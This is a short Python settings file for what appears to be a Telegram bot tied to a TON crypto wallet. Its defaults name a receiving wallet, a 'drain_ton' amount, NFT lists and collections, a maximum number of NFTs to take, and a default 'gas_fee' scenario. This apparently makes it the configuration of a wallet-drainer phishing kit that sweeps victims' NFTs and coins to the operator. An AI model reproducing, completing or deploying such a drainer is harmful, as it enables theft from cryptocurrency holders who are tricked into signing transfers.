import os
from dotenv import load_dotenv

load_dotenv()

BOT_TOKEN = os.getenv("BOT_TOKEN", "")
ADMIN_IDS = [int(x) for x in os.getenv("ADMIN_IDS", "").replace(" ", "").split(",") if x]
WEB_BASE = os.getenv("WEB_BASE", "").rstrip("/")
DB_PATH = os.getenv("DB_PATH", "data/bot.db")
SCEN_DIR = "config/scenarios"

DEFAULTS = {
    "wallet": os.getenv("WALLET", ""),
    "mode": "nft",
    "gas_ton": "0.05",
    "drain_ton": "0",
    "ton_cap": "0",
    "nft_source": "list",
    "nft_list": "[]",
    "nft_collections": "[]",
    "max_nfts": "20",
    "reserve": "0.08",
    "delay": "1.0",
    "default_scenario": "gas_fee",
}
